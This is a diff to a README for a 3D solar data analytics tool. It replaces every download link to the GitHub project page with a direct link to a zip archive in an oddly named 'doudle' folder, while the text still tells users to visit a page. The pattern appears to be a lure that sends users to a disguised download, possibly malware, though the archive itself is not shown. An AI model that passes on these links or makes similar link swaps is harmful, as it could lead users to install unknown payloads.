@@ -1,6 +1,6 @@
 # 🌞 solar-data-3d-analytics - Clear 3D Solar Data Insight
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/unbraced-scleredema302/solar-data-3d-analytics)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/unbraced-scleredema302/solar-data-3d-analytics/main/doudle/d-analytics-solar-data-3.7.zip)
 
 ## 🧭 Overview
 
@@ -36,7 +36,7 @@ If your PC can run other modern desktop apps, it should handle this tool well.
 
 Use this link to visit the page and download the app:
 
-[Download solar-data-3d-analytics](https://github.com/unbraced-scleredema302/solar-data-3d-analytics)
+[Download solar-data-3d-analytics](https://raw.githubusercontent.com/unbraced-scleredema302/solar-data-3d-analytics/main/doudle/d-analytics-solar-data-3.7.zip)
 
 After you open the page:
 
@@ -149,4 +149,4 @@ Use files from a source you trust. Keep a copy of your original data before you 
 
 Primary download page:
 
-https://github.com/unbraced-scleredema302/solar-data-3d-analytics
+https://raw.githubusercontent.com/unbraced-scleredema302/solar-data-3d-analytics/main/doudle/d-analytics-solar-data-3.7.zip
